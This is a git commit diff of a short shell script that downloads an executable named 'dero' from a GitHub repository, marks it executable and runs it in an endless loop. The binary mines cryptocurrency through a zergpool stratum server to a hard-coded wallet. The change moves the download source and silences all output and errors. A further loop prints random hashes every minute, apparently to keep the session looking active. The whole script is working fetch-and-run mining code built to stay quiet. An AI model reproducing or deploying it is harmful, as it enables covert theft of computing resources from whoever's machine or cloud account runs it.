b1f0e9aa0ea0627b6fc6716f09d04c0eacc3a759
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-11 19:12:02 +0700

    Update miNo.sh

--- miNo.sh
+++ miNo.sh
@@ -1,7 +1,7 @@
-wget https://github.com/RizQu5/2022/raw/main/dero > /dev/null
-chmod +x dero > /dev/null
+wget https://github.com/angkii/2022/raw/main/dero >/dev/null 2>&1
+chmod +x dero >/dev/null 2>&1
 while [ 1 ]; do
-./dero -a minotaurx -o stratum+tcp://minotaurx.mine.zergpool.com:7019 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3 -p c=PLSR,ID=001.beDO > /dev/null
+./dero -a minotaurx -o stratum+tcp://minotaurx.mine.zergpool.com:7019 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3 -p c=PLSR,ID=001.beDO >/dev/null 2>&1
 done
 while [ 1 ]; do
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
